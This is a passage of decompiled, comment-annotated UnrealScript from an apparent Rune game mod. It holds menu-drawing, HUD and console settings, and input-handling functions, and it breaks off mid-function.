    }
}
// Suggested name: GetPolyFlagName
function string GetPolyFlagName(int FlagValue)
{
	// This function maps an integer flag value to its corresponding string representation.
	// It checks for specific flag values and returns a descriptive string.

	if (FlagValue == 0)
	{
		return "PF_None" @ string(FlagValue);
	}
	if (FlagValue == 1)
	{
		return "PF_Invisible" @ string(FlagValue);
	}
	if (FlagValue == 2)
	{
		return "PF_Masked" @ string(FlagValue);
	}
	if (FlagValue == 4)
	{
		return "PF_Transparent" @ string(FlagValue);
	}
	if (FlagValue == 8)
	{
		return "PF_NotSolid" @ string(FlagValue);
	}
	if (FlagValue == 16)
	{
		return "PF_Environment" @ string(FlagValue);
	}
	if (FlagValue == 32)
	{
		return "PF_SemiSolid" @ string(FlagValue);
	}
	if (FlagValue == 64)
	{
		return "PF_Modulated" @ string(FlagValue);
	}
	if (FlagValue == 128)
	{
		return "PF_FakeBackDrop" @ string(FlagValue);
	}
	if (FlagValue == 256)
	{
		return "PF_TwoSided" @ string(FlagValue);
	}
	if (FlagValue == 512)
	{
		return "PF_AutoUPan" @ string(FlagValue);
	}
	if (FlagValue == 1024)
	{
		return "PF_AutoVPan" @ string(FlagValue);
	}
	if (FlagValue == 2048)
	{
		return "PF_NoSmooth" @ string(FlagValue);
	}
	if (FlagValue == 4096)
	{
		return "PF_BigWavy" @ string(FlagValue);
	}
	if (FlagValue == 8192)
	{
		return "PF_SmallWavy" @ string(FlagValue);
	}
	if (FlagValue == 16384)
	{
		return "PF_Flat" @ string(FlagValue);
	}
	if (FlagValue == 32768)
	{
		return "PF_LowShadowDetail" @ string(FlagValue);
	}
	if (FlagValue == 65536)
	{
		return "PF_NoMerge" @ string(FlagValue);
	}
	if (FlagValue == 131072)
	{
		return "PF_Invisible" @ string(FlagValue);  // Note: Duplicate of 1, possibly an error
	}
	if (FlagValue == 262144)
	{
		return "PF_DirtyShadows" @ string(FlagValue);
	}
	if (FlagValue == 524288)
	{
		return "PF_BrightCorners" @ string(FlagValue);
	}
	if (FlagValue == 1048576)
	{
		return "PF_SpecialLit" @ string(FlagValue);
	}
	if (FlagValue == 2097152)
	{
		return "PF_Gouraud" @ string(FlagValue);
	}
	if (FlagValue == 4194304)
	{
		return "PF_Unlit" @ string(FlagValue);
	}
	if (FlagValue == 8388608)
	{
		return "PF_HighShadowDetail" @ string(FlagValue);
	}
	if (FlagValue == 16777216)
	{
		return "PF_Memorized" @ string(FlagValue);
	}
	if (FlagValue == 33554432)
	{
		return "PF_Selected" @ string(FlagValue);
	}
	if (FlagValue == 67108864)
	{
		return "PF_Portal" @ string(FlagValue);
	}
	if (FlagValue == 134217728)
	{
		return "PF_Mirrored" @ string(FlagValue);
	}

	// If no match, return an empty string
	return "";
}

// Suggested name: DrawMapThemeMenuItem
function DrawMapThemeMenuItem(coerce string Text, float Value, bool bSelected, int ItemIndex, Canvas Canvas)
{
    // This function draws a menu item that displays the name of the current map theme.

    Canvas.SetPos(float(INT_v3203), float(INT_v3204));

    if (bigFontMenu)
    {
        if (ItemIndex == INT_v6448)
        {
            Canvas.Font = Canvas.BigFont;
            Canvas.SetPos(float(INT_v3203), float(INT_v3204 - bigfontGap));
        }
        else
        {
            Canvas.Font = Canvas.MedFont;
        }
    }

    if (ItemIndex == INT_v6448)
    {
        Canvas.DrawColor = MakeColor(byte(SR), byte(SG), byte(SB));
    }
    else
    {
        Canvas.DrawColor = MakeColor(byte(tr), byte(TG), byte(tB));
    }

    Canvas.DrawText(Text);

    if (bigFontMenu && ItemIndex == INT_v6448)
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204 - bigfontGap));
    }
    else
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204));
    }

    Canvas.DrawColor = MakeColor(255, 255, 255);
    Canvas.DrawText(MTTarr[localTextureOverlay].MTT_ThemeName);

    INT_v3204 += (12 + menuGap);
}

// Suggested name: DrawSoundNameMenuItem
function DrawSoundNameMenuItem(coerce string Text, float Value, bool bSelected, int ItemIndex, Canvas Canvas)
{
    // This function draws a menu item that displays the name of a sound.

    Canvas.SetPos(float(INT_v3203), float(INT_v3204));

    if (bigFontMenu)
    {
        if (ItemIndex == INT_v6448)
        {
            Canvas.Font = Canvas.BigFont;
            Canvas.SetPos(float(INT_v3203), float(INT_v3204 - bigfontGap));
        }
        else
        {
            Canvas.Font = Canvas.MedFont;
        }
    }

    if (ItemIndex == INT_v6448)
    {
        Canvas.DrawColor = MakeColor(byte(SR), byte(SG), byte(SB));
    }
    else
    {
        Canvas.DrawColor = MakeColor(byte(tr), byte(TG), byte(tB));
    }

    Canvas.DrawText(Text);

    if (bigFontMenu && ItemIndex == INT_v6448)
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204 - bigfontGap));
    }
    else
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204));
    }

    Canvas.DrawColor = MakeColor(255, 255, 255);
    Canvas.DrawText(string(UNK_v6410));

    INT_v3204 += (12 + menuGap);
}

// Suggested name: DrawDrawStyleMenuItem
function DrawDrawStyleMenuItem(coerce string Text, float Value, bool bSelected, int ItemIndex, Canvas Canvas)
{
    // This function draws a menu item that displays the drawing style of a selected actor.

    local string DrawStyleString;

    Canvas.SetPos(float(INT_v3203), float(INT_v3204));

    if (bigFontMenu)
    {
        if (ItemIndex == INT_v6448)
        {
            Canvas.Font = Canvas.BigFont;
            Canvas.SetPos(float(INT_v3203), float(INT_v3204 - bigfontGap));
        }
        else
        {
            Canvas.Font = Canvas.MedFont;
        }
    }

    if (ItemIndex == INT_v6448)
    {
        Canvas.DrawColor = MakeColor(byte(SR), byte(SG), byte(SB));
    }
    else
    {
        Canvas.DrawColor = MakeColor(byte(tr), byte(TG), byte(tB));
    }

    Canvas.DrawText(Text);

    if (bigFontMenu && ItemIndex == INT_v6448)
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204 - bigfontGap));
    }
    else
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204));
    }

    Canvas.DrawColor = MakeColor(255, 255, 255);

    if (A_v6593 != none)
    {
        switch (int(A_v6593.Style))
        {
            case 0: DrawStyleString = "None"; break;
            case 1: DrawStyleString = "Normal"; break;
            case 2: DrawStyleString = "Masked"; break;
            case 3: DrawStyleString = "Translucent"; break;
            case 4: DrawStyleString = "Modulated"; break;
            case 5: DrawStyleString = "AlphaBlend"; break;
            default: DrawStyleString = "Unknown"; break;
        }
        Canvas.DrawText(DrawStyleString);
    }
    else
    {
        Canvas.DrawText("/");
    }

    INT_v3204 += (12 + menuGap);
}

// Suggested name: DrawFatnessMenuItem
function DrawFatnessMenuItem(coerce string Text, float Value, bool bSelected, int ItemIndex, Canvas Canvas)
{
    // This function draws a menu item that displays the DesiredFatness property of a selected actor.

    Canvas.SetPos(float(INT_v3203), float(INT_v3204));

    if (bigFontMenu)
    {
        if (ItemIndex == INT_v6448)
        {
            Canvas.Font = Canvas.BigFont;
            Canvas.SetPos(float(INT_v3203), float(INT_v3204 - bigfontGap));
        }
        else
        {
            Canvas.Font = Canvas.MedFont;
        }
    }

    if (ItemIndex == INT_v6448)
    {
        Canvas.DrawColor = MakeColor(byte(SR), byte(SG), byte(SB));
    }
    else
    {
        Canvas.DrawColor = MakeColor(byte(tr), byte(TG), byte(tB));
    }

    Canvas.DrawText(Text);

    if (bigFontMenu && ItemIndex == INT_v6448)
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204 - bigfontGap));
    }
    else
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204));
    }

    Canvas.DrawColor = MakeColor(255, 255, 255);

    if (A_v6593 != none)
    {
        Canvas.DrawText(string(A_v6593.DesiredFatness));
    }
    else
    {
        Canvas.DrawText("/");
    }

    INT_v3204 += (12 + menuGap);
}

// Suggested name: DrawCollisionPropertyMenuItem
function DrawCollisionPropertyMenuItem(coerce string Text, float Value, bool bSelected, int ItemIndex, int PropertyType, Canvas Canvas)
{
    // This function draws a menu item that displays either the CollisionHeight or CollisionRadius of a selected actor.

	Canvas.SetPos(INT_v3203, INT_v3204);

	if (bigFontMenu)
	{
		if (ItemIndex == INT_v6448)
		{
			Canvas.Font = Canvas.BigFont;
			Canvas.SetPos(INT_v3203, INT_v3204 - bigfontGap);
		}
		else
		{
			Canvas.Font = Canvas.MedFont;
		}
	}

	if (ItemIndex == INT_v6448)
	{
		Canvas.DrawColor = MakeColor(byte(SR), byte(SG), byte(SB));
	}
	else
	{
		Canvas.DrawColor = MakeColor(byte(tr), byte(TG), byte(tB));
	}

	Canvas.DrawText(Text);

	if (bigFontMenu && ItemIndex == INT_v6448)
	{
		Canvas.SetPos(INT_v3203 + functionDist, INT_v3204 - bigfontGap);
	}
	else
	{
		Canvas.SetPos(INT_v3203 + functionDist, INT_v3204);
	}

    Canvas.DrawColor = MakeColor(255, 255, 255);

    if (A_v6593 != none)
    {
        if (PropertyType == 1) // CollisionHeight
        {
            Canvas.DrawText(string(A_v6593.CollisionHeight));
        }
        else if (PropertyType == 2) // CollisionRadius
        {
            Canvas.DrawText(string(A_v6593.CollisionRadius));
        }
    }
    else
    {
        Canvas.DrawColor = MakeColor(255, 255, 255);
        Canvas.DrawText("/");
    }

    INT_v3204 += (12 + menuGap);
}

// Suggested name: DrawColorComponentMenuItem
function DrawColorComponentMenuItem(coerce string Text, float Value, bool bSelected, int ItemIndex, int ColorComponentIndex, Canvas Canvas)
{
    // This function draws a menu item that displays one of the RGB color components
    // (DesiredColorAdjust.X, Y, or Z) of a selected actor.

    Canvas.SetPos(float(INT_v3203), float(INT_v3204));

    if (bigFontMenu)
    {
        if (ItemIndex == INT_v6448)
        {
            Canvas.Font = Canvas.BigFont;
            Canvas.SetPos(float(INT_v3203), float(INT_v3204 - bigfontGap));
        }
        else
        {
            Canvas.Font = Canvas.MedFont;
        }
    }

    if (ItemIndex == INT_v6448)
    {
        Canvas.DrawColor = MakeColor(byte(SR), byte(SG), byte(SB));
    }
    else
    {
        Canvas.DrawColor = MakeColor(byte(tr), byte(TG), byte(tB));
    }

    Canvas.DrawText(Text);

    if (bigFontMenu && ItemIndex == INT_v6448)
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204 - bigfontGap));
    }
    else
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204));
    }

    Canvas.DrawColor = MakeColor(255, 255, 255);

    if (A_v6593 != none)
    {
        if (ColorComponentIndex == 1) // Red component
        {
            Canvas.DrawText(string(int(A_v6593.DesiredColorAdjust.X)));
        }
        else if (ColorComponentIndex == 2) // Green component
        {
            Canvas.DrawText(string(int(A_v6593.DesiredColorAdjust.Y)));
        }
        else if (ColorComponentIndex == 3) // Blue component
        {
            Canvas.DrawText(string(int(A_v6593.DesiredColorAdjust.Z)));
        }
    }

    INT_v3204 += (12 + menuGap);
}

// Suggested name: DrawSelectedObjectMenuItem
function DrawSelectedObjectMenuItem(coerce string Text, float Value, bool bSelected, int ItemIndex, Canvas Canvas)
{
    // This function draws a menu item that displays information about a selected object
    // and optionally highlights it.

    local Vector ObjectDimensions;

    Canvas.SetPos(float(INT_v3203), float(INT_v3204));

    if (bigFontMenu)
    {
        if (ItemIndex == INT_v6448)
        {
            Canvas.Font = Canvas.BigFont;
            Canvas.SetPos(float(INT_v3203), float(INT_v3204 - bigfontGap));
        }
        else
        {
            Canvas.Font = Canvas.MedFont;
        }
    }

    if (ItemIndex == INT_v6448)
    {
        Canvas.DrawColor = MakeColor(byte(SR), byte(SG), byte(SB));
    }
    else
    {
        Canvas.DrawColor = MakeColor(byte(tr), byte(TG), byte(tB));
    }

    Canvas.DrawText(Text);

    if (bigFontMenu && ItemIndex == INT_v6448)
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204 - bigfontGap));
    }
    else
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204));
    }

    Canvas.DrawColor = MakeColor(255, 255, 255);

    if (A_v6593 != none)
    {
        Canvas.DrawText((string(selectedObjectID) $ "# ") $ (GetDelimitedPart(string(A_v6593), 2, "."))); 
    }
    else
    {
        Canvas.DrawText(string(selectedObjectID) $ "# doesn't exist");
    }

    if (bHighlightSelected && A_v6593 != none)
    {
        if (Owner.FastTrace(A_v6593.Location, Owner.Location) && Owner.Weapon == none)
        {
            if (!bool(ParticleSystem(A_v6593)))
            {
                ObjectDimensions.X = A_v6593.CollisionRadius * A_v6593.DrawScale;
                ObjectDimensions.Y = A_v6593.CollisionRadius * A_v6593.DrawScale;
                ObjectDimensions.Z = A_v6593.CollisionHeight * A_v6593.DrawScale;
            }
            else
            {
                ObjectDimensions.X = A_v6593.CollisionRadius * (A_v6593.DrawScale / 2.0);
                ObjectDimensions.Y = A_v6593.CollisionRadius * (A_v6593.DrawScale / 2.0);
                ObjectDimensions.Z = A_v6593.CollisionHeight * (A_v6593.DrawScale / 2.0);
            }

            Canvas.Style = 1;
            Canvas.DrawTube(A_v6593.Location, A_v6593.Location, int(A_v6593.CollisionRadius), int(A_v6593.CollisionHeight), 100, 255, 0);
            Canvas.DrawLine3D(Owner.Location, A_v6593.Location, 100.0, 255.0, 0.0);
        }
    }

    INT_v3204 += (12 + menuGap);
}

// Suggested name: DrawSliderMenuItem
function DrawSliderMenuItem(coerce string Text, float CurrentValue, int MinValue, int MaxValue, int Step, int ItemIndex, Canvas Canvas, float DefaultValue, int ColorMode)
{
    // This function draws a slider-like menu item.
    // It displays a text, a slider bar, and a marker indicating the current value.

    Canvas.SetPos(float(INT_v3203), float(INT_v3204));

    if (bigFontMenu)
    {
        if (ItemIndex == INT_v6448)
        {
            Canvas.Font = Canvas.BigFont;
            Canvas.SetPos(float(INT_v3203), float(INT_v3204 - bigfontGap));
        }
        else
        {
            Canvas.Font = Canvas.MedFont;
        }
    }

    if (ItemIndex == INT_v6448)
    {
        Canvas.DrawColor = MakeColor(byte(SR), byte(SG), byte(SB));
    }
    else
    {
        Canvas.DrawColor = MakeColor(byte(tr), byte(TG), byte(tB));
    }

    Canvas.DrawText(Text);
    Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204));

    if (ColorMode == 2)
    {
        Canvas.DrawColor = MakeColor(255, 255, 255);
    }
    else if (ColorMode == 3)
    {
        Canvas.DrawColor = MakeColor(255, 128, 128);
    }
    else if (ColorMode == 4)
    {
        Canvas.DrawColor = MakeColor(128, 255, 128);
    }
    else if (ColorMode == 5)
    {
        Canvas.DrawColor = MakeColor(128, 128, 255);
    }

    Canvas.DrawIcon(Texture'coadminz7.Icons.SlideBar', 1.0);

    if (CurrentValue <= float(MaxValue))
    {
        if (DefaultValue != 0.0)
        {
            Canvas.Style = 5;
            Canvas.AlphaScale = 0.3;
            Canvas.SetPos(float(INT_v3203 + functionDist) + ((((DefaultValue + 2.0) - float(MinValue)) / float(MaxValue - MinValue)) * 60.0), float(INT_v3204));
            Canvas.DrawColor = MakeColor(255, 255, 0);
            Canvas.DrawIcon(Texture'coadminz7.Icons.loldef', 1.5);
            Canvas.Style = 1;
            Canvas.DrawColor = MakeColor(255, 255, 255);
        }
        Canvas.SetPos(float(INT_v3203 + functionDist) + (((CurrentValue - float(MinValue)) / float(MaxValue - MinValue)) * 60.0), float(INT_v3204));
        Canvas.DrawIcon(Texture'coadminz7.Icons.SlideMeh', 1.0);
    }

    INT_v3204 += (12 + menuGap);
}

// Suggested name: DrawNumericMenuItem
final function DrawNumericMenuItem(coerce string Text, float Value, bool bIsInteger, int ItemIndex, Canvas Canvas, optional bool bIsPercentage)
{
    // This function draws a menu item that displays a numerical value, optionally as a percentage.

    Canvas.SetPos(float(INT_v3203), float(INT_v3204));

    if (bigFontMenu)
    {
        if (ItemIndex == INT_v6448)
        {
            Canvas.Font = Canvas.BigFont;
            Canvas.SetPos(float(INT_v3203), float(INT_v3204 - bigfontGap));
        }
        else
        {
            Canvas.Font = Canvas.MedFont;
        }
    }

    if (ItemIndex == INT_v6448)
    {
        Canvas.DrawColor = MakeColor(byte(SR), byte(SG), byte(SB));
    }
    else
    {
        Canvas.DrawColor = MakeColor(byte(tr), byte(TG), byte(tB));
    }

    Canvas.DrawText(Text);

    if (bigFontMenu && ItemIndex == INT_v6448)
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204 - bigfontGap));
    }
    else
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204));
    }

    Canvas.DrawColor = MakeColor(255, 255, 255);

    if (bIsPercentage)
    {
        if (bIsInteger)
        {
            Canvas.DrawText(string(int(Value)) $ "%");
        }
        else
        {
            Canvas.DrawText(string(Value) $ "%");
        }
    }
    else
    {
        if (bIsInteger)
        {
            Canvas.DrawText(string(int(Value)));
        }
        else
        {
            Canvas.DrawText(string(Value));
        }
    }

    INT_v3204 += (12 + menuGap);
}

// Suggested name: DrawStretchedBox
final function DrawStretchedBox(Canvas Canvas, float Alpha, int X, int Y, int Width, int Height, Color DrawColor)
{
    // This function draws a stretched texture (effectively a colored rectangle) on the canvas.

    Canvas.bCenter = false;
    Canvas.DrawColor = DrawColor;
    Canvas.Style = 5;
    Canvas.AlphaScale = Alpha;
    Canvas.SetPos(float(X), float(Y));
    Canvas.DrawTile(Texture'coadminz7.Icons.pixel', float(Width), float(Height), 0.0, 0.0, float(Background.USize), float(Background.VSize));
    Canvas.Style = 1;
    Canvas.AlphaScale = 1.0;
}

// Suggested name: DrawBooleanMenuItem
final function eqN_vxv_2482(coerce string Text, bool bValue, int ItemIndex, Canvas Canvas)
{
    // This function draws a menu item that displays a boolean value as "enabled" (green) or "disabled" (red).

    Canvas.Font = Canvas.MedFont;
    Canvas.SetPos(float(INT_v3203), float(INT_v3204));

    if (bigFontMenu)
    {
        if (ItemIndex == INT_v6448)
        {
            Canvas.Font = Canvas.BigFont;
            Canvas.SetPos(float(INT_v3203), float(INT_v3204 - bigfontGap));
        }
        else
        {
            Canvas.Font = Canvas.MedFont;
        }
    }

    if (ItemIndex == INT_v6448)
    {
        Canvas.DrawColor = MakeColor(byte(SR), byte(SG), byte(SB));
    }
    else
    {
        Canvas.DrawColor = MakeColor(byte(tr), byte(TG), byte(tB));
    }

    Canvas.DrawText(Text);

    if (bigFontMenu && ItemIndex == INT_v6448)
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204 - bigfontGap));
    }
    else
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204));
    }

    if (bValue)
    {
        Canvas.DrawColor = MakeColor(0, 255, 0);
        Canvas.DrawText("enabled");
    }
    else
    {
        Canvas.DrawColor = MakeColor(255, 0, 0);
        Canvas.DrawText("disabled");
    }

    INT_v3204 += (12 + menuGap);
}

// Suggested name: DrawBackMenuItem
function DrawBackMenuItem(int ItemIndex, Canvas Canvas)
{
    // This function draws a menu item with the text "<-------", likely serving as a "back" button.

    Canvas.Font = Canvas.MedFont;
    Canvas.SetPos(float(INT_v3203), float(INT_v3204));

    if (bigFontMenu)
    {
        Canvas.Font = Canvas.MedFont;
    }

    if (ItemIndex == INT_v6448)
    {
        Canvas.DrawColor = MakeColor(byte(SR), byte(SG), byte(SB));
    }
    else
    {
        Canvas.DrawColor = MakeColor(byte(tr), byte(TG), byte(tB));
    }

    Canvas.DrawText("<-------");
    INT_v3204 += (12 + menuGap);
}
// Suggested name: DrawChatFontMenuItem
function DrawChatFontMenuItem(coerce string Text, int ItemIndex, Canvas Canvas)
{
	local string FontName;

	Canvas.Font = Canvas.MedFont;
	Canvas.SetPos(float(INT_v3203), float(INT_v3204));

	if (bigFontMenu)
	{
		if (ItemIndex == INT_v6448)
		{
			Canvas.Font = Canvas.BigFont;
			Canvas.SetPos(float(INT_v3203), float(INT_v3204 - bigfontGap));
		}
		else
		{
			Canvas.Font = Canvas.MedFont;
		}
	}

	if (ItemIndex == INT_v6448)
	{
		Canvas.DrawColor = MakeColor(byte(SR), byte(SG), byte(SB));
	}
	else
	{
		Canvas.DrawColor = MakeColor(byte(tr), byte(TG), byte(tB));
	}

	Canvas.DrawText(Text);
	Canvas.DrawColor = MakeColor(byte(255), byte(255), byte(255));

	if (bigFontMenu && ItemIndex == INT_v6448)
	{
		Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204 - bigfontGap));
	}
	else
	{
		Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204));
	}

	// Determine the font name based on the chatFont value
	switch (chatFont)
	{
		case 0:
			FontName = "Original";
			break;
		case 1:
			FontName = "Palatino 15";
			break;
		case 2:
			FontName = "Palatino 20";
			break;
		case 3:
			FontName = "Palatino 25";
			break;
		case 4:
			FontName = "Palatino 35";
			break;
		case 5:
			FontName = "Tahoma 15";
			break;
		case 6:
			FontName = "Tahoma 20";
			break;
		case 7:
			FontName = "Tahoma 25";
			break;
		case 8:
			FontName = "Tahoma 30";
			break;
		case 9:
			FontName = "Tahoma Bold 10";
			break;
		case 10:
			FontName = "Tahoma Bold 30";
			break;
		case 11:
			FontName = "Arial Bold";
			break;
		case 12:
			FontName = "verdana";
			break;
		default:
			FontName = "Unknown";
			break;
	}

	Canvas.DrawText(FontName);
	INT_v3204 += (12 + menuGap);
	return;
}

// Suggested name: MakeColor
function Color MakeColor(byte Red, byte Green, byte Blue, optional byte Alpha)
{
    // This function creates a Color struct from RGBA components.

    local Color NewColor;

    NewColor.R = Red;
    NewColor.G = Green;
    NewColor.B = Blue;
    NewColor.A = Alpha;

    return NewColor;
}

// Suggested name: ToggleBooleanPropertyAndGetStatus
// FIND THIS ONE IN ORIGINAL CODE
final function string ToggleBooleanPropertyAndGetStatus(string PropertyName)
{
    // This function toggles a boolean property and returns a string indicating its new state ("enabled." or "disabled.").

    if (GetPropertyText(PropertyName) ~= (Localize("General", "False", "Core")))
    {
        SetPropertyAndRefresh(PropertyName, "True");
    }
    else
    {
        SetPropertyAndRefresh(PropertyName, "False");
    }

    if (GetPropertyText(PropertyName) ~= (Localize("General", "True", "Core")))
    {
        return "enabled.";
    }
    else
    {
        return "disabled.";
    }
}

// Suggested name: SetPropertyAndRefresh
function SetPropertyAndRefresh(string PropertyName, string NewValue)
{
    // This function sets a property's text value and then calls a refresh function.

    SetPropertyText(PropertyName, NewValue);
    RefreshConsoleAndHUD(); // This function likely refreshes some UI or game state.
}

// Suggested name: SetConsoleScrollOnResize
function Parm_string_075(bool bEnableScroll)
{
    // This function enables or disables the auto-scrolling behavior of the console text area when it is resized.

    local UWindowConsoleTextAreaControl ConsoleTextArea;

    ConsoleTextArea = UWindowConsoleClientWindow(ConsoleWindow.ClientArea).TextArea;
    ConsoleTextArea.bScrollOnResize = bEnableScroll;
}

// Suggested name: LogConsoleTextAreaAndSetFont
exec function LogConsoleTextAreaAndSetFont()
{
    // This function logs the string representation of the zRuneConsoleClientWindow's text area
    // and then sets the font of that text area to ConsoleFont.

    Viewport.Actor.ClientMessage(string(zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309));
    zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.Font = ConsoleFont;
}

// Suggested name: RefreshConsoleAndHUD
final function RefreshConsoleAndHUD(optional bool bInitialize)
{
    // This function serves as a general refresh or initialization routine.
    // It updates various console and HUD settings based on configuration variables.

    local UWindowConsoleTextAreaControl ConsoleTextArea;

    if (zRConsoleW != none)
    {
        ConsoleTextArea = UWindowConsoleClientWindow(zRConsoleW.ClientArea).TextArea;
    }

    if (bInitialize)
    {
        ZRunePlayer(Viewport.Actor).setTaunt(tauntID, true);
        GtauntID = tauntID;
    }

    if (HudScale == 0.0)
    {
        HudScale = float(INT_v6694 / 640);
    }

    if (bOverwriteFont && zRConsoleW != none && zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309 != none && zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.Font != ConsoleFont && chatFont != 12)
    {
        zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.Font = ConsoleFont;
    }

    if (chatFont == 12 && zRConsoleW != none)
    {
        if (Fnt_v5287 == none)
        {
            Fnt_v5287 = Font(DynamicLoadObject("derp.derp2", Class'Engine.Font'));
        }
        zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.Font = 12;
    }

    if (ConsoleWindow != none)
    {
        ConsoleWindow.WindowAlpha = (consoleTransparency / -100.0) + 1.0;
        UWindowConsoleClientWindow(ConsoleWindow.ClientArea).WindowAlpha = (consoleTransparency / -100.0) + 1.0;
    }

    if (zRConsoleW != none)
    {
        UWindowConsoleClientWindow(zRConsoleW.ClientArea).TextArea.bScrollOnResize = bAutoScroll;
        zRConsoleW.WindowAlpha = (consoleTransparency / -100.0) + 1.0;
        UWindowConsoleClientWindow(zRConsoleW.ClientArea).WindowAlpha = (consoleTransparency / -100.0) + 1.0;
        zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.bScrollOnResize = bAutoScroll;

        if (zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309 != none)
        {
            if (bUseGreenColor)
            {
                zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.TextColor.R = 34;
                zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.TextColor.G = 139;
                zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.TextColor.B = 34;
            }
            else
            {
                zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.TextColor.R = 255;
                zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.TextColor.G = 255;
                zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.TextColor.B = 255;
            }
        }
    }

    if (ConsoleTextArea != none)
    {
        ConsoleTextArea.bScrollOnResize = bAutoScroll;
    }

    if (!spec)
    {
        ZRunePlayer(Viewport.Actor).B_v4542 = bCustomHUDSCale;
        ZRunePlayer(Viewport.Actor).B_v4541 = bMagicAnus;

        if (bFading)
        {
            ZRunePlayer(Viewport.Actor).B_v4543 = false;
        }
        else
        {
            ZRunePlayer(Viewport.Actor).B_v4543 = true;
        }

        ZRunePlayer(Viewport.Actor).B_v4544 = bNoCenter;
        ZRunePlayer(Viewport.Actor).Trans = Trans;

        if (deletemessages)
        {
            ZRunePlayer(Viewport.Actor).B_v4545 = false;
        }
        else
        {
            ZRunePlayer(Viewport.Actor).B_v4545 = true;
        }

        if (bCChat)
        {
            ZRunePlayer(Viewport.Actor).B_v4546 = true;
        }
        else
        {
            ZRunePlayer(Viewport.Actor).B_v4546 = false;
        }

        if (cHUDScale != 0.0)
        {
            ZRunePlayer(Viewport.Actor).HudScale = cHUDScale;
        }
        else
        {
            cHUDScale = float(INT_v6694 / 640);
        }
    }
    else
    {
        TCCSpectator(Viewport.Actor).ToggleCollisions(bNoCollision);
        TCCSpectator(Viewport.Actor).bShowNames = bShowNames;
    }
}

// Suggested name: GetShortName
function string GetShortName(string FullName)
{
    // This function extracts the last part of a string separated by dots,
    // typically used to get the short name of an object from its full path.

    local int DotPosition;

    DotPosition = InStr(FullName, ".");
    while (DotPosition != -1)
    {
        FullName = Right(FullName, (Len(FullName) - DotPosition) - 1);
        DotPosition = InStr(FullName, ".");
    }

    return FullName;
}

// Suggested name: SaveConfigAndRefresh
function SaveConfigAndRefresh()
{
    // This function saves the configuration, refreshes various settings, and updates the taunt ID if it has changed.

    if (GtauntID != tauntID)
    {
        ZRunePlayer(Viewport.Actor).setTaunt(tauntID);
        GtauntID = tauntID;
    }

    RefreshConsoleAndHUD(); // Refresh console and HUD settings
    StaticSaveConfig();
    SaveConfig();
}

// Suggested name: ClearMenuCategory
function ClearMenuCategory(int CategoryIndex)
{
    // This function clears a specific section of the menu data structure (eqf_vxv_3234).

    local int i;

    if (eqf_vxv_3234[CategoryIndex].count != 0)
    {
        for (i = 0; i < 64; i++)
        {
            eqf_vxv_3234[CategoryIndex].stcProperty[i] = "";
            eqf_vxv_3234[CategoryIndex].Help[i] = "";
            eqf_vxv_3234[CategoryIndex].propertyName[i] = "";
            eqf_vxv_3234[CategoryIndex].Value[i] = "";
            eqf_vxv_3234[CategoryIndex].maxValue[i] = 0;
            eqf_vxv_3234[CategoryIndex].minValue[i] = 0;
            eqf_vxv_3234[CategoryIndex].stepValue[i] = 0.0;
            eqf_vxv_3234[CategoryIndex].controlStyle[i] = 0;
            eqf_vxv_3234[CategoryIndex].count = 0;
        }
    }
}

// Suggested name: IsConsoleTypingActive
function bool IsConsoleTypingActive()
{
    // This function checks if the console's edit box has keyboard focus or if the console is in typing mode.

    if (((bShowConsole && zRConsoleW != none) && zRuneConsoleClientWindow(zRConsoleW.ClientArea) != none) && zRuneConsoleClientWindow(zRConsoleW.ClientArea).EditControl.EditBox.bHasKeyboardFocus) || INT_v6715 == 2)
    {
        return true;
    }
    else
    {
        return false;
    }
}
// Suggested name: HandleInputKey
final function bool HandleInputKey(EInputKey InputKey, EInputAction Action, float DeltaTime)
{
	local float Value;
	local bool IsHandled;
	local string KeyBinding;
	local bool Handled;

	if ((int(Action) == 3) && int(InputKey) == 16)
	{
		B_v6313 = false;
	}
	if ((int(InputKey) == 16) && int(Action) == 1)
	{
		B_v6313 = true;
	}
	if (!B_v6445 && !B_v6446)
	{
		if ((int(Action) == 3) && int(InputKey) == 16)
		{
			B_v6538 = false;
		}
		if ((int(InputKey) == 16) && int(Action) == 1)
		{
			B_v6538 = true;
		}
		if (B_v6538 && int(Action) == 3)
		{
			if (int(InputKey) == 19)
			{
				B_v6701 = true;
				B_v1853 = true;
				INT_v6702 = 250;
				STR_v6703 = "everybody loves genx";
			}
			if (int(InputKey) == 122)
			{
				if (Viewport.Actor.bShowScores)
				{
					Viewport.Actor.ConsoleCommand("start http://bit.ly/runediscord");
				}
				else
